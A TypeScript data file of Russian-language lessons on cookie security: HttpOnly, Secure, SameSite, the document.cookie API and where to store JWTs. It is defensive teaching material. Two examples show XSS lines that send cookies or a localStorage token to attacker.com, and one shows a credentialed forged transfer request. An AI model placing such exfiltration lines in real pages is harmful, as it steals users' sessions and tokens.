import { Topic } from '../../../types';

export const SECURITY_COOKIES_INTERMEDIATE_TOPICS: Topic[] = [
  {
    id: 'cookies-httponly',
    title: 'HttpOnly: защита от XSS (но не полная!)',
    description: 'HttpOnly атрибут предотвращает доступ к cookie через JavaScript (document.cookie). Это защищает от XSS атак, которые пытаются украсть cookies. Однако важно понимать, что HttpOnly защищает только от чтения, но не от отправки зловредным скриптом.',
    difficulty: 'intermediate',
    isFrontendEssential: true,
    tags: ['security', 'cookies', 'httponly', 'xss', 'front-end-essential'],
    keyPoints: [
      'HttpOnly блокирует доступ к cookie через document.cookie.',
      'Защищает от XSS атак, которые пытаются украсть cookies.',
      'НО: HttpOnly НЕ защищает от отправки cookie зловредным скриптом.',
      'Злоумышленник не может прочитать cookie, но может отправить запрос с ней.',
      'Нужна дополнительная защита: CSP, санитизация, SameSite.'
    ],
    examples: [
      {
        title: 'Как работает HttpOnly',
        code: `// ✅ С HttpOnly:
// Set-Cookie: sessionId=abc123; HttpOnly; Secure

// На клиенте:
console.log(document.cookie); // Не содержит sessionId
// HttpOnly cookie недоступна через JavaScript ✅

// ❌ Без HttpOnly:
// Set-Cookie: sessionId=abc123; Secure

// На клиенте:
console.log(document.cookie); // "sessionId=abc123"
// Cookie доступна через JavaScript ❌

// XSS атака может украсть cookie:
const stolenCookie = document.cookie;
fetch('https://attacker.com/steal?cookie=' + stolenCookie);`
      },
      {
        title: 'Важно: HttpOnly НЕ защищает полностью!',
        code: `// ⚠️ Частое заблуждение:
// "HttpOnly cookie защищает от XSS" — НЕТ!

// HttpOnly защищает только от ЧТЕНИЯ cookie через JavaScript
// НО не защищает от ОТПРАВКИ cookie зловредным скриптом

// Пример:
// 1. XSS внедрен на странице
// 2. Злоумышленник не может прочитать HttpOnly cookie
// 3. НО может отправить запрос, и браузер автоматически включит cookie!

fetch('https://api.example.com/transfer', {
  method: 'POST',
  credentials: 'include', // Отправляет HttpOnly cookie автоматически!
  body: JSON.stringify({ to: 'attacker', amount: 1000 })
});

// Запрос выполнен с HttpOnly cookie, даже если скрипт не может её прочитать!

// ✅ Полная защита требует:
// 1. HttpOnly (защита от чтения)
// 2. CSP (защита от XSS)
// 3. Санитизация (защита от XSS)
// 4. SameSite (защита от CSRF)`
      }
    ],
    relatedTopics: ['cookies-basics', 'cookies-samesite', 'xss-basics']
  },
  {
    id: 'cookies-secure',
    title: 'Secure: только HTTPS',
    description: 'Secure атрибут гарантирует, что cookie отправляется только по HTTPS соединению. Это защищает cookie от перехвата при передаче по незащищенному HTTP соединению.',
    difficulty: 'intermediate',
    isFrontendEssential: true,
    tags: ['security', 'cookies', 'secure', 'https', 'front-end-essential'],
    keyPoints: [
      'Secure гарантирует отправку cookie только по HTTPS.',
      'Защищает от перехвата cookie при передаче по HTTP.',
      'Обязателен для cookies с чувствительными данными (токены, сессии).',
      'В production всегда использовать Secure для важных cookies.',
      'В development может быть отключен для локальной разработки.'
    ],
    examples: [
      {
        title: 'Использование Secure',
        code: `// ✅ С Secure:
// Set-Cookie: sessionId=abc123; Secure; HttpOnly

// Cookie отправляется только по HTTPS:
// ✅ https://example.com → cookie отправляется
// ❌ http://example.com → cookie НЕ отправляется

// Установка на сервере:
res.cookie('sessionId', 'abc123', {
  secure: true, // Только HTTPS
  httpOnly: true,
  sameSite: 'lax'
});

// ⚠️ В development (localhost):
// Secure может быть проблемой, если нет HTTPS
// Можно отключить для локальной разработки:
res.cookie('sessionId', 'abc123', {
  secure: process.env.NODE_ENV === 'production', // Только в production
  httpOnly: true
});`
      }
    ],
    relatedTopics: ['cookies-basics', 'cookies-httponly', 'https-basics']
  },
  {
    id: 'cookies-samesite',
    title: 'SameSite: защита от CSRF (Strict, Lax, None)',
    description: 'SameSite атрибут контролирует, когда cookies отправляются с кросс-сайтовыми запросами. SameSite=Strict полностью блокирует отправку, SameSite=Lax разрешает только GET при навигации, SameSite=None всегда отправляет (требует Secure).',
    difficulty: 'intermediate',
    isFrontendEssential: true,
    tags: ['security', 'cookies', 'samesite', 'csrf', 'front-end-essential'],
    keyPoints: [
      'SameSite=Strict: cookies НЕ отправляются с кросс-сайтовых запросов (максимальная защита).',
      'SameSite=Lax: cookies отправляются только с GET при навигации (компромисс, рекомендуется).',
      'SameSite=None: cookies всегда отправляются (требует Secure, небезопасно).',
      'SameSite защищает от CSRF для POST/PUT/DELETE запросов.',
      'SameSite=Lax — хороший компромисс между безопасностью и функциональностью.'
    ],
    examples: [
      {
        title: 'SameSite значения',
        code: `// 1. SameSite=Strict (максимальная защита)
// Set-Cookie: sessionId=abc123; SameSite=Strict; Secure; HttpOnly

// Cookies НЕ отправляются с кросс-сайтовых запросов
// ✅ Защита от CSRF
// ❌ Может ломать функциональность (OAuth redirects, внешние ссылки)

// 2. SameSite=Lax (рекомендуется)
// Set-Cookie: sessionId=abc123; SameSite=Lax; Secure; HttpOnly

// Cookies отправляются:
// ✅ При навигации (переход по ссылке)
// ✅ С GET запросами при навигации
// ❌ НЕ отправляются с POST/PUT/DELETE кросс-сайтовых запросов
// ❌ НЕ отправляются с AJAX запросами с других доменов

// ✅ Защита от CSRF для POST/PUT/DELETE
// ✅ Сохранение функциональности для навигации

// 3. SameSite=None (небезопасно)
// Set-Cookie: sessionId=abc123; SameSite=None; Secure; HttpOnly

// Требует Secure флаг (только HTTPS)
// Cookies всегда отправляются
// ❌ НЕ защищает от CSRF`
      },
      {
        title: 'Практика: "Как защитить форму перевода денег от CSRF?"',
        code: `// ✅ Полная защита от CSRF:

// 1. SameSite=Lax (или Strict) cookies
res.cookie('sessionId', 'abc123', {
  sameSite: 'lax', // Защита от CSRF
  secure: true,
  httpOnly: true
});

// 2. CSRF токен в форме
<form action="/transfer" method="POST">
  <input type="hidden" name="csrf_token" value="\${csrfToken}">
  <!-- остальные поля -->
</form>

// 3. Проверка Origin header на сервере
if (req.headers.origin !== 'https://trusted-domain.com') {
  return res.status(403).json({ error: 'Invalid origin' });
}

// Многоуровневая защита:
// 1. SameSite cookies (блокирует автоматическую отправку)
// 2. CSRF токен (дополнительная проверка)
// 3. Проверка Origin (дополнительная проверка)`
      }
    ],
    relatedTopics: ['cookies-httponly', 'csrf-tokens', 'csrf-samesite']
  },
  {
    id: 'cookies-document-api',
    title: 'document.cookie API',
    description: 'document.cookie — это API для чтения и записи cookies на клиенте. Важно понимать его ограничения: нельзя прочитать HttpOnly cookies, нельзя установить Secure/SameSite через JavaScript, и API работает только с cookies текущего домена.',
    difficulty: 'intermediate',
    isFrontendEssential: true,
    tags: ['security', 'cookies', 'document.cookie', 'api', 'front-end-essential'],
    keyPoints: [
      'document.cookie возвращает все доступные cookies (кроме HttpOnly).',
      'Установка cookie: document.cookie = "name=value; attributes".',
      'Нельзя прочитать HttpOnly cookies через document.cookie.',
      'Нельзя установить Secure/SameSite через JavaScript (только сервер).',
      'API работает только с cookies текущего домена.'
    ],
    examples: [
      {
        title: 'Использование document.cookie',
        code: `// Чтение всех cookies
const allCookies = document.cookie;
// "theme=dark; lang=ru; userId=123"
// HttpOnly cookies НЕ видны!

// Парсинг конкретной cookie
function getCookie(name: string): string | null {
  const value = \`; \${document.cookie}\`;
  const parts = value.split(\`; \${name}=\`);
  if (parts.length === 2) {
    return parts.pop()?.split(';').shift() || null;
  }
  return null;
}

const theme = getCookie('theme'); // "dark"

// Установка cookie
document.cookie = 'theme=light; path=/; max-age=86400';

// Удаление cookie (установка с истекшим временем)
document.cookie = 'theme=; path=/; max-age=0';`
      },
      {
        title: 'Ограничения document.cookie',
        code: `// ❌ Нельзя прочитать HttpOnly cookies
// Set-Cookie: sessionId=abc123; HttpOnly
console.log(document.cookie); // Не содержит sessionId

// ❌ Нельзя установить Secure/SameSite через JavaScript
// Эти атрибуты устанавливаются только сервером

// ✅ Можно установить только:
document.cookie = 'theme=dark; path=/; max-age=86400';
// path, max-age, expires, domain (с ограничениями)

// ✅ Безопасность:
// - HttpOnly cookies недоступны через JavaScript
// - Secure/SameSite контролируются только сервером
// - Это защищает от XSS атак`
      }
    ],
    relatedTopics: ['cookies-basics', 'cookies-httponly', 'xss-basics']
  },
  {
    id: 'cookies-token-storage',
    title: 'Безопасное хранение токенов',
    description: 'Хранение токенов (JWT, session tokens) требует баланса между безопасностью и функциональностью. HttpOnly cookies — самый безопасный способ для токенов, так как они недоступны через JavaScript и защищены от XSS.',
    difficulty: 'intermediate',
    isFrontendEssential: true,
    tags: ['security', 'cookies', 'tokens', 'jwt', 'storage', 'front-end-essential'],
    keyPoints: [
      'HttpOnly cookies — самый безопасный способ хранения токенов.',
      'localStorage уязвим для XSS (токен может быть украден).',
      'sessionStorage безопаснее localStorage, но все еще уязвим для XSS.',
      'Cookies лучше localStorage для токенов из-за HttpOnly защиты.',
      'Практика: "Куда и как сохранить JWT токен после логина?"'
    ],
    examples: [
      {
        title: 'Сравнение способов хранения токенов',
        code: `// 1. HttpOnly cookies (РЕКОМЕНДУЕТСЯ) ✅
// Set-Cookie: token=abc123; HttpOnly; Secure; SameSite=Lax

// ✅ Преимущества:
// - Недоступен через JavaScript (защита от XSS)
// - Автоматически отправляется с запросами
// - Защищен Secure и SameSite

// ❌ Недостатки:
// - Недоступен через JavaScript (если нужен доступ)

// 2. localStorage (НЕ РЕКОМЕНДУЕТСЯ) ❌
localStorage.setItem('token', 'abc123');

// ❌ Недостатки:
// - Доступен через JavaScript (уязвим для XSS)
// - XSS → доступ к localStorage → украсть токен
// - Циклическая зависимость: "безопасен, если нет XSS" — НЕТ!

// 3. sessionStorage (ЛУЧШЕ, но все еще уязвим)
sessionStorage.setItem('token', 'abc123');

// ✅ Преимущества:
// - Удаляется при закрытии вкладки
// - Недоступен другим вкладкам

// ❌ Недостатки:
// - Все еще уязвим для XSS

// 4. Memory storage (для SPA)
let token: string | null = null; // В памяти

// ✅ Преимущества:
// - Недоступен через XSS (если нет доступа к переменной)
// - Удаляется при перезагрузке страницы

// ❌ Недостатки:
// - Теряется при перезагрузке
// - Недоступен другим вкладкам`
      },
      {
        title: 'Практика: "Куда и как сохранить JWT токен после логина?"',
        code: `// ✅ РЕКОМЕНДУЕМЫЙ способ: HttpOnly cookie

// На сервере после успешного логина:
res.cookie('accessToken', jwtToken, {
  httpOnly: true,    // Защита от XSS
  secure: true,      // Только HTTPS
  sameSite: 'lax',   // Защита от CSRF
  maxAge: 3600000    // 1 час
});

// На клиенте:
// Токен автоматически отправляется с запросами
fetch('/api/data', {
  credentials: 'include' // Отправляет cookie
});

// ✅ Альтернатива: Memory storage (если нужен доступ через JS)
let accessToken: string | null = null;

async function login(username: string, password: string) {
  const response = await fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify({ username, password })
  });
  const { token } = await response.json();
  accessToken = token; // В памяти, не в localStorage!
}

// Использование:
fetch('/api/data', {
  headers: {
    'Authorization': \`Bearer \${accessToken}\`
  }
});

// ❌ НЕ использовать localStorage для токенов!
// localStorage.setItem('token', token); // Уязвимо для XSS!`
      },
      {
        title: 'Чем cookies лучше localStorage для токенов',
        code: `// Сравнение cookies и localStorage:

// ✅ Cookies (HttpOnly):
// 1. Недоступны через JavaScript (HttpOnly)
// 2. Защищены от XSS (нельзя прочитать через document.cookie)
// 3. Автоматически отправляются с запросами
// 4. Защищены Secure и SameSite
// 5. Контролируются сервером

// ❌ localStorage:
// 1. Доступны через JavaScript
// 2. Уязвимы для XSS (можно прочитать через localStorage.getItem)
// 3. Нужно вручную добавлять в заголовки
// 4. Нет встроенной защиты
// 5. Контролируются клиентом

// Пример XSS атаки:
// Злоумышленник внедряет:
const token = localStorage.getItem('token');
fetch('https://attacker.com/steal?token=' + token);

// С HttpOnly cookie это невозможно:
// document.cookie не содержит HttpOnly cookie
// Злоумышленник не может прочитать токен ✅`
      }
    ],
    relatedTopics: ['cookies-httponly', 'cookies-samesite', 'data-storage-basics', 'authentication-jwt']
  }
];
